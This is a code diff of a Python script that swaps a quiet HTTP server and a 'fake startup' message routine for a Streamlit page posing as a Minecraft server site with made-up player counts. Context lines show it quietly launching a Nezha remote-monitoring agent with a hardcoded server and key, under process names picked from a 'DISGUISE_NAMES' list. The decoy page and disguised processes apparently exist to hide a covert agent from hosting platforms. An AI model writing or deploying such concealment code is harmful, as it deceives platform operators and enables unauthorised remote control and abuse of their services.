@@ -3,13 +3,11 @@ import time
 import subprocess
 import platform
 import random
-import sys
-from threading import Thread
-from http.server import HTTPServer, SimpleHTTPRequestHandler
+import streamlit as st
+import streamlit.components.v1 as components
 
 # Environment variables
 FILE_PATH = os.environ.get('FILE_PATH', '.cache')
-PORT = int(os.environ.get('PORT', 3000))
 NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'nezha.loc.cc:443')
 NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
 NEZHA_KEY = os.environ.get('NEZHA_KEY', '4z0HWnSGJtKFtKOlfJxSkNC3F8PIJ448')
@@ -20,87 +18,6 @@ DISGUISE_NAMES = ['cache_manager', 'session_handler', 'task_worker', 'log_rotato
 
 def get_random_name():
     return random.choice(DISGUISE_NAMES)
-
-class QuietHTTPHandler(SimpleHTTPRequestHandler):
-    """HTTP Handler that serves files quietly"""
-    
-    def log_message(self, format, *args):
-        pass  # Suppress logging
-    
-    def do_GET(self):
-        if self.path == '/' or self.path == '/index.html':
-            self.serve_index()
-        else:
-            super().do_GET()
-    
-    def serve_index(self):
-        index_path = 'index.html'
-        if os.path.exists(index_path):
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            with open(index_path, 'rb') as f:
-                self.wfile.write(f.read())
-        else:
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            default_html = b'''<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-        .container {
-            text-align: center;
-            padding: 40px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-        }
-        h1 { margin-bottom: 10px; }
-        p { opacity: 0.8; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Welcome</h1>
-        <p>Application is running successfully.</p>
-    </div>
-</body>
-</html>'''
-            self.wfile.write(default_html)
-
-def run_web_server():
-    """Run HTTP server in background"""
-    server = HTTPServer(('0.0.0.0', PORT), QuietHTTPHandler)
-    server.serve_forever()
-
-def fake_startup():
-    """Display fake Flask/web app startup messages"""
-    print("Starting application...")
-    time.sleep(0.3)
-    print(" * Loading configuration...")
-    time.sleep(0.2)
-    print(" * Initializing modules...")
-    time.sleep(0.2)
-    print(" * Starting background workers...")
-    time.sleep(0.2)
-    print(f" * Running on http://0.0.0.0:{PORT}")
-    print(" * Application started successfully")
-    print("Press CTRL+C to quit")
-    sys.stdout.flush()
 
 def create_directory():
     if not os.path.exists(FILE_PATH):
@@ -209,18 +126,399 @@ uuid: {UUID}"""
     
     exec_cmd(command)
 
-def main():
+# 初始化后台任务（只运行一次）
+if 'initialized' not in st.session_state:
     create_directory()
     run_agent()
-    
-    # Start web server in background thread
-    server_thread = Thread(target=run_web_server, daemon=True)
-    server_thread.start()
-    
-    fake_startup()
-    
-    while True:
-        time.sleep(3600)
+    st.session_state.initialized = True
 
-if __name__ == "__main__":
-    main()
+# Streamlit 页面配置
+st.set_page_config(
+    page_title="Minecraft Server",
+    page_icon="⛏️",
+    layout="wide"
+)
+
+# 隐藏 Streamlit 默认元素
+st.markdown("""
+<style>
+    #MainMenu {visibility: hidden;}
+    footer {visibility: hidden;}
+    header {visibility: hidden;}
+    .stApp {
+        margin: 0;
+        padding: 0;
+    }
+</style>
+""", unsafe_allow_html=True)
+
+# 完整的 HTML 页面
+html_content = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minecraft Server</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a472a 0%, #2d5016 50%, #1a472a 100%);
+            min-height: 100vh;
+            color: #fff;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo {
+            font-size: 48px;
+            font-weight: bold;
+            text-shadow: 4px 4px 0 #000, 2px 2px 0 #333;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+
+        .logo span {
+            color: #5c913b;
+        }
+
+        .subtitle {
+            font-size: 18px;
+            opacity: 0.9;
+        }
+
+        .server-card {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 3px solid #5c913b;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .server-status {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 25px;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .status-dot {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background: #4ade80;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .status-text {
+            font-size: 18px;
+            font-weight: bold;
+            color: #4ade80;
+        }
+
+        .players-online {
+            background: rgba(92, 145, 59, 0.3);
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+
+        .server-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+        }
+
+        .info-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .info-label {
+            font-size: 14px;
+            opacity: 0.7;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        .info-value {
+            font-size: 20px;
+            font-weight: bold;
+            color: #5c913b;
+        }
+
+        .copy-btn {
+            background: #5c913b;
+            border: none;
+            color: #fff;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-left: 10px;
+            transition: background 0.3s;
+        }
+
+        .copy-btn:hover {
+            background: #4a7a2f;
+        }
+
+        .copy-btn:active {
+            transform: scale(0.95);
+        }
+
+        .how-to-join {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 12px;
+            padding: 30px;
+            border: 3px solid #444;
+        }
+
+        .how-to-join h2 {
+            margin-bottom: 20px;
+            color: #5c913b;
+        }
+
+        .steps {
+            list-style: none;
+        }
+
+        .steps li {
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .steps li:last-child {
+            border-bottom: none;
+        }
+
+        .step-number {
+            background: #5c913b;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .feature {
+            background: rgba(92, 145, 59, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            border: 2px solid transparent;
+            transition: border-color 0.3s;
+        }
+
+        .feature:hover {
+            border-color: #5c913b;
+        }
+
+        .feature-icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .feature-name {
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            opacity: 0.7;
+        }
+
+        .discord-btn {
+            display: inline-block;
+            background: #5865F2;
+            color: #fff;
+            padding: 12px 30px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 20px;
+            transition: background 0.3s;
+        }
+
+        .discord-btn:hover {
+            background: #4752c4;
+        }
+
+        @media (max-width: 600px) {
+            .logo {
+                font-size: 32px;
+            }
+            
+            .server-status {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">CRAFT<span>WORLD</span></div>
+            <p class="subtitle">Survival Multiplayer Server</p>
+        </header>
+
+        <div class="server-card">
+            <div class="server-status">
+                <div class="status-indicator">
+                    <div class="status-dot"></div>
+                    <span class="status-text">SERVER ONLINE</span>
+                </div>
+                <div class="players-online">👥 5 / 50 Players</div>
+            </div>
+
+            <div class="server-info">
+                <div class="info-item">
+                    <div class="info-label">Server Address</div>
+                    <div class="info-value">
+                        sk1.liquidnodes.online
+                        <button class="copy-btn" onclick="copyIP()">Copy</button>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Port</div>
+                    <div class="info-value">25663</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Version</div>
+                    <div class="info-value">1.20.4</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Game Mode</div>
+                    <div class="info-value">Survival</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="how-to-join">
+            <h2>📖 How to Join</h2>
+            <ol class="steps">
+                <li>
+                    <span class="step-number">1</span>
+                    <span>Launch Minecraft Java Edition (Version 1.20.4)</span>
+                </li>
+                <li>
+                    <span class="step-number">2</span>
+                    <span>Click "Multiplayer" from the main menu</span>
+                </li>
+                <li>
+                    <span class="step-number">3</span>
+                    <span>Click "Add Server" button</span>
+                </li>
+                <li>
+                    <span class="step-number">4</span>
+                    <span>Enter server address: <strong>sk1.liquidnodes.online</strong></span>
+                </li>
+                <li>
+                    <span class="step-number">5</span>
+                    <span>Click "Done" and join the server!</span>
+                </li>
+            </ol>
+        </div>
+
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">⚔️</div>
+                <div class="feature-name">PvP Arena</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🏠</div>
+                <div class="feature-name">Land Claim</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">💰</div>
+                <div class="feature-name">Economy</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🎁</div>
+                <div class="feature-name">Daily Rewards</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">👑</div>
+                <div class="feature-name">Ranks</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🌍</div>
+                <div class="feature-name">World Border</div>
+            </div>
+        </div>
+
+        <div style="text-align: center;">
+            <a href="#" class="discord-btn">💬 Join our Discord</a>
+        </div>
+
+        <footer>
+            <p>© 2024 uptime Server. All rights reserved.</p>
+            <p>Not affiliated with Mojang Studios.</p>
+        </footer>
+    </div>
+
+    <script>
+        function copyIP() {
+            navigator.clipboard.writeText('sk1.liquidnodes.online').then(() => {
+                const btn = document.querySelector('.copy-btn');
+                btn.textContent = 'Copied!';
+                setTimeout(() => {
+                    btn.textContent = 'Copy';
+                }, 2000);
+            });
+        }
+    </script>
+</body>
+</html>
+"""
+
+# 使用 components.html 渲染完整的 HTML 页面
+components.html(html_content, height=1200, scrolling=True)
